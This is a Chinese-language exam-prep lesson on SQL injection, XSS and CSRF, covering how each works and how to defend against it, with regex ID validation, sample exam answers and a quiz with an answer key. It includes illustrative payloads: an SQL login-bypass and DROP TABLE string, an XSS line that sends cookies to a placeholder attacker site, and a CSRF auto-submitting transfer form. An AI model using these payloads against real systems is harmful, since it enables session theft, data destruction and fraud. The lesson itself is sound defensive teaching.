# 5-3 Web 攻擊與輸入驗證：SQL Injection、XSS、CSRF 🎯💼

> 對應考古題：108（SQL Injection 的風險、危害，寫一個字串處理函數）、110（何謂 SQL Injection、如何防範）、114（SQL Injection、XSS、CSRF 的原理與防禦，各 5 分）、107（用多條件判斷和正規表示法檢查身分證字號）

## 觀念

網頁應用程式要接收使用者的輸入（表單、網址參數、Cookie），**所有來自使用者的輸入都不可信任**。
這一課的三種攻擊，都是因為程式「把使用者的輸入當成程式碼或指令執行」，或「沒有確認請求是不是使用者本人發出的」。

| 攻擊 | 攻擊的對象 | 一句話原理 |
|---|---|---|
| **SQL Injection** | **資料庫** | 輸入夾帶 SQL 語法，被資料庫當成指令執行 |
| **XSS** | **其他使用者的瀏覽器** | 輸入夾帶 JavaScript，被其他人的瀏覽器執行 |
| **CSRF** | **已登入的使用者** | 誘騙使用者的瀏覽器，用他的登入身分送出他不知道的請求 |

## 🎯 SQL Injection（SQL 注入）

> 原理、攻擊範例和防範寫法的完整說明在 [SQL 9-5 課](../../SQL/09_進階物件與安全/9-5_SQL_Injection.md)，這裡只整理考試重點。

**原理**：程式用**字串串接**組合 SQL，攻擊者在輸入中夾帶 SQL 語法，改變原本查詢的意思。

```
程式：  "SELECT * FROM users WHERE id = '" + 輸入 + "' AND pwd = '" + 密碼 + "'"
輸入：  ' OR '1'='1' --
結果：  SELECT * FROM users WHERE id = '' OR '1'='1' --' AND pwd = '...'
                                          ↑ 永遠成立      ↑ 後面被註解掉
```

**危害**：
- 繞過登入驗證（機密性）
- 讀取整個資料庫，例如客戶個資（機密性）
- 竄改或刪除資料，例如 `'; DROP TABLE users; --`（完整性、可用性）
- 在某些資料庫設定下，甚至可以執行作業系統指令，進一步控制主機

**防範**：

| 措施 | 說明 |
|---|---|
| **① 參數化查詢**（Prepared Statement）**最重要** | SQL 結構和參數分開傳給資料庫，參數只會被當成「值」，不會被當成語法 |
| ② 輸入驗證 | 用**白名單**限制格式，例如帳號只能是英數字 |
| ③ 最小權限 | 應用程式連資料庫的帳號只給必要權限，不用管理員帳號 |
| ④ 錯誤訊息不外洩 | 不把資料庫錯誤訊息直接顯示給使用者（避免洩漏資料表結構） |
| ⑤ 網頁應用程式防火牆（WAF） | 過濾常見的攻擊字串，作為額外的防線 |

⚠️ 只靠「過濾特殊字元」（黑名單）不夠，攻擊者有很多繞過的寫法。**參數化查詢**才是根本解法。

## 🎯 XSS（跨網站指令碼，Cross-Site Scripting）

**原理**：網站把使用者的輸入**沒有處理就顯示在網頁上**，攻擊者在輸入中夾帶 JavaScript，其他使用者瀏覽這個網頁時，**他們的瀏覽器**就會執行這段程式碼。

例：留言板直接顯示留言內容，攻擊者留言：
```html
<script>fetch('https://攻擊者網站/?c=' + document.cookie)</script>
```
每個看到這則留言的人，瀏覽器都會把自己的 Cookie（含登入的 Session ID）送給攻擊者。

### 三種 XSS

| 種類 | 惡意程式碼存在哪裡 | 例子 |
|---|---|---|
| **儲存型**（Stored） | 存在**伺服器的資料庫**裡，所有瀏覽的人都會中招，危害最大 | 留言板、商品評論 |
| **反射型**（Reflected） | 放在**網址參數**裡，伺服器把它「反射」回網頁；要誘騙受害者點擊特製連結 | 搜尋結果頁顯示「您搜尋的是：（輸入內容）」 |
| **DOM 型**（DOM-based） | 不經過伺服器，**前端 JavaScript** 直接把網址中的內容寫進網頁 | 用 `innerHTML` 顯示網址參數 |

**危害**：竊取 Cookie 冒用身分（Session 劫持）、竄改網頁內容、把使用者導向釣魚網站、記錄鍵盤輸入。

**防範**：

| 措施 | 說明 |
|---|---|
| **① 輸出編碼**（Output Encoding）**最重要** | 顯示到網頁前，把特殊字元轉成 HTML 實體，例如 `<` 轉成 `&lt;`，瀏覽器就只會把它當文字顯示 |
| ② 輸入驗證 | 白名單限制格式 |
| ③ Cookie 設定 **HttpOnly** | JavaScript 讀不到這個 Cookie，就算有 XSS 也偷不走 Session ID |
| ④ 內容安全政策（**CSP**） | 用 HTTP 標頭規定網頁只能執行哪些來源的程式碼 |
| ⑤ 使用框架內建的防護 | React、Vue、Angular 等框架預設會做輸出編碼，不要刻意繞過（例如避免直接用 `innerHTML`） |

輸出編碼的寫法（JavaScript）：

```javascript
function escapeHtml(s) {
  return s.replace(/&/g, '&amp;')     // & 要最先處理，避免重複轉換
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#39;');
}
escapeHtml('<script>alert(1)</script>');
// 結果：&lt;script&gt;alert(1)&lt;/script&gt;  → 瀏覽器只會把它當文字顯示
```

## 🎯 CSRF（跨站請求偽造，Cross-Site Request Forgery）

**原理**：使用者已經登入 A 網站（瀏覽器存有 A 的 Cookie），攻擊者誘騙他打開惡意網頁，惡意網頁**自動向 A 網站送出請求**。
瀏覽器會**自動帶上 A 網站的 Cookie**，A 網站以為是使用者本人操作，就執行了。

```
① 使用者登入網路銀行，瀏覽器保存了登入 Cookie
② 使用者在另一個分頁打開攻擊者的網頁（例如點了釣魚信的連結）
③ 攻擊者網頁裡藏了一個自動送出的表單：
     <form action="https://銀行/transfer" method="POST">
       <input name="to" value="攻擊者帳號">
       <input name="amount" value="50000">
     </form>
     <script>document.forms[0].submit()</script>
④ 瀏覽器送出請求時自動帶上銀行的 Cookie → 銀行以為是本人操作，完成轉帳
```

**危害**：以受害者的身分轉帳、修改密碼或電子郵件、刪除資料。

**防範**：

| 措施 | 說明 |
|---|---|
| **① CSRF Token**（反偽造權杖）**最重要** | 伺服器在表單中放一個**隨機、不可預測**的值，送出時檢查；攻擊者的網頁拿不到這個值 |
| ② Cookie 設定 **SameSite** | 規定跨網站的請求不要帶上這個 Cookie（`SameSite=Lax` 或 `Strict`） |
| ③ 重要操作**再次驗證** | 轉帳、改密碼時要求再輸入密碼或 OTP |
| ④ 檢查請求來源 | 檢查 `Origin`、`Referer` 標頭是否來自自己的網站 |
| ⑤ 改變狀態的操作不用 GET | GET 請求很容易被 `<img src="...">` 觸發 |

### XSS 和 CSRF 比較

| | XSS | CSRF |
|---|---|---|
| 攻擊者利用的是 | 使用者對**網站**的信任（網站上的內容被植入程式碼） | 網站對**使用者瀏覽器**的信任（以為請求是本人發的） |
| 惡意程式碼在哪裡執行 | 在**目標網站**的頁面上 | 在**攻擊者的網站**上，請求送到目標網站 |
| 能不能讀取回應 | 可以 | **不行**，只能讓請求送出去 |
| 主要防禦 | **輸出編碼** | **CSRF Token** |

💡 有 XSS 漏洞時，CSRF Token 也保護不了：攻擊者的程式碼在網站頁面上執行，可以直接讀到 Token。

## 🎯 OWASP Top 10

**OWASP**（開放網路應用程式安全計畫）定期整理最常見的 Web 應用程式安全風險。以下是 **2021 版**：

| 排名 | 風險 | 本課相關 |
|---|---|---|
| A01 | 權限控制失效（Broken Access Control） | |
| A02 | 加密機制失效（Cryptographic Failures） | 4-4 課 |
| A03 | **注入攻擊**（Injection） | **SQL Injection、XSS** |
| A04 | 不安全設計（Insecure Design） | 5-4 課 |
| A05 | 安全設定缺陷（Security Misconfiguration） | |
| A06 | 危險或過舊的元件（Vulnerable and Outdated Components） | |
| A07 | 認證及驗證機制失效（Identification and Authentication Failures） | 4-1 課 |
| A08 | 軟體及資料完整性失效（Software and Data Integrity Failures） | |
| A09 | 資安記錄及監控失效（Security Logging and Monitoring Failures） | |
| A10 | 伺服器端請求偽造（SSRF） | |

⚠️ OWASP 每隔幾年會改版，考前到官網確認最新版本。2021 版把 XSS 併入 A03 注入攻擊，CSRF 則沒有單獨列在 Top 10。

## 🎯 輸入驗證與正規表示法

### 輸入驗證的原則

| 原則 | 說明 |
|---|---|
| **白名單優於黑名單** | 規定「**只允許**什麼」（例如只能是數字），比列出「**不允許**什麼」安全，黑名單一定會漏 |
| **伺服器端一定要驗證** | 前端（瀏覽器）的驗證可以被輕易繞過，只能用來改善使用體驗 |
| **驗證後還是要用參數化查詢和輸出編碼** | 輸入驗證是第一道防線，不能取代其他防護 |

### 107 年題：檢查身分證字號格式

身分證字號的格式：
- 共 **10** 碼
- 第 1 碼：**大寫英文字母**（代表戶籍地）
- 第 2 碼：**1**（男）或 **2**（女）
- 第 3～10 碼：**數字**，最後一碼是檢查碼

**方法一：多條件判斷**

```javascript
function checkIdByConditions(id) {
  if (typeof id !== 'string' || id.length !== 10) return false;   // 長度必須是 10
  const first = id[0];
  if (first < 'A' || first > 'Z') return false;                   // 第 1 碼：大寫英文字母
  if (id[1] !== '1' && id[1] !== '2') return false;               // 第 2 碼：1 或 2
  for (let i = 2; i < 10; i++) {                                  // 第 3～10 碼：數字
    if (id[i] < '0' || id[i] > '9') return false;
  }
  return true;
}
```

**方法二：正規表示法**

```javascript
function checkIdByRegex(id) {
  return /^[A-Z][12]\d{8}$/.test(id);
}
```

| 符號 | 意思 |
|---|---|
| `^`、`$` | 字串的開頭和結尾（確保**整個字串**都符合，不是只有一部分） |
| `[A-Z]` | 一個大寫英文字母 |
| `[12]` | 一個字元，是 1 或 2 |
| `\d{8}` | 8 個數字（`\d` 代表數字，`{8}` 代表剛好 8 次） |

**進階：驗證檢查碼**（題目沒要求，但工作上會用到）

```javascript
function checkIdWithChecksum(id) {
  if (!/^[A-Z][12]\d{8}$/.test(id)) return false;
  const codes = 'ABCDEFGHJKLMNPQRSTUVXYWZIO';        // 依序對應 10～35
  const n = codes.indexOf(id[0]) + 10;               // 英文字母轉成兩位數，例如 A = 10
  let sum = Math.floor(n / 10) * 1 + (n % 10) * 9;   // 十位數 ×1、個位數 ×9
  const weights = [8, 7, 6, 5, 4, 3, 2, 1, 1];       // 第 2～10 碼的權重
  for (let i = 1; i < 10; i++) sum += Number(id[i]) * weights[i - 1];
  return sum % 10 === 0;                             // 總和是 10 的倍數才正確
}
// checkIdWithChecksum('A123456789') → true
// checkIdWithChecksum('A123456788') → false（檢查碼錯誤）
```

⚠️ 新式的外來人口統一證號，第 2 碼是 8 或 9。系統如果要接受外籍人士，規則要另外處理。

## 💼 工作實作

- **用瀏覽器開發人員工具（F12）觀察**：「網路」分頁可以看到每個請求的參數和 Cookie；「應用程式」分頁可以看到 Cookie 有沒有設定 HttpOnly、Secure、SameSite
- **弱點掃描**：國營事業的對外網站每年要做弱點掃描和滲透測試（5-4 課），報告中最常見的就是本課這幾種漏洞，開發人員要能看懂報告並修正
- **委外驗收**：委外開發的系統，驗收時要確認有做參數化查詢、輸出編碼和 CSRF 防護，最好要求廠商提供源碼掃描報告

## 📝 考古題示範

### 114 年：請說明 SQL Injection、XSS、CSRF 的行為原理及如何防禦（每題 5 分）

> 參考答案（自己寫的，不是官方答案）

**（一）SQL Injection**
- **原理**：應用程式以字串串接組合 SQL 指令，攻擊者在輸入中夾帶 SQL 語法（如 `' OR '1'='1' --`），改變查詢邏輯，藉此繞過登入、竊取或竄改資料庫內容
- **防禦**：使用參數化查詢；以白名單驗證輸入；資料庫帳號採最小權限；不顯示詳細錯誤訊息；部署 WAF

**（二）XSS**
- **原理**：網站未經處理就把使用者輸入顯示在網頁上，攻擊者植入 JavaScript，其他使用者瀏覽時在其瀏覽器中執行，可竊取 Cookie、冒用身分或竄改頁面。分為儲存型、反射型、DOM 型
- **防禦**：輸出時進行 HTML 編碼；驗證輸入；Cookie 設定 HttpOnly；設定內容安全政策（CSP）

**（三）CSRF**
- **原理**：使用者登入目標網站後，被誘騙開啟惡意網頁，惡意網頁自動向目標網站送出請求，瀏覽器自動附帶登入 Cookie，網站誤以為是本人操作
- **防禦**：表單加入隨機的 CSRF Token 並在伺服器端驗證；Cookie 設定 SameSite；重要操作要求再次驗證；檢查 Origin／Referer

### 108 年第四題（三）：寫一個字串處理函數 checkdata，傳回無風險的資料，每行要註解

題目的後端是類似 PHP 的寫法，用字串串接查詢 `id` 欄位。

> 參考答案（自己寫的，不是官方答案）

```php
function checkdata($data) {
    $data = trim($data);                               // 去除前後空白
    $data = preg_replace('/[^A-Za-z0-9]/', '', $data); // 白名單：只保留英文字母和數字，其他字元（含 ' ; - 空白）全部移除
    $data = substr($data, 0, 20);                      // 限制最大長度為 20 個字元
    return $data;                                      // 傳回處理後的資料
}
```

說明：題目要檢查的是 `id`，正常的 ID 只會有英數字，所以用**白名單**最安全。如果是地址這類需要中文和符號的欄位，就不能用這個白名單，應該改用參數化查詢。
答題時可以補一句：「**根本的解法是改用參數化查詢**，字串處理函數只是輔助」，展現你知道正確的做法。

## 小測驗

1. 攻擊者在留言板留下含有 JavaScript 的留言，其他使用者瀏覽時被竊取 Cookie，這是哪一種攻擊？
   (A) SQL Injection (B) 儲存型 XSS (C) CSRF (D) 反射型 XSS

2. 防範 SQL Injection 最根本有效的方法是？
   (A) 過濾單引號 (B) 參數化查詢 (C) 使用 HTTPS (D) 隱藏網址參數

3. 防範 CSRF 最主要的方法是？
   (A) 輸出編碼 (B) CSRF Token (C) 參數化查詢 (D) 防毒軟體

4. Cookie 設定 HttpOnly 屬性，主要可以降低哪一種攻擊的危害？
   (A) SQL Injection (B) XSS 竊取 Cookie (C) DDoS (D) 暴力破解

5. 正規表示法 `^[A-Z][12]\d{8}$` 中，`\d{8}` 的意思是？
   (A) 8 個任意字元 (B) 8 個英文字母 (C) 剛好 8 個數字 (D) 最多 8 個數字

6. 關於輸入驗證，下列敘述何者正確？
   (A) 只要前端有驗證，後端就不用驗證 (B) 黑名單比白名單安全 (C) 伺服器端一定要驗證 (D) 做了輸入驗證就不需要參數化查詢

<details>
<summary>看答案</summary>

1. **(B)**
2. **(B)**
3. **(B)**
4. **(B)**
5. **(C)**
6. **(C)**
</details>
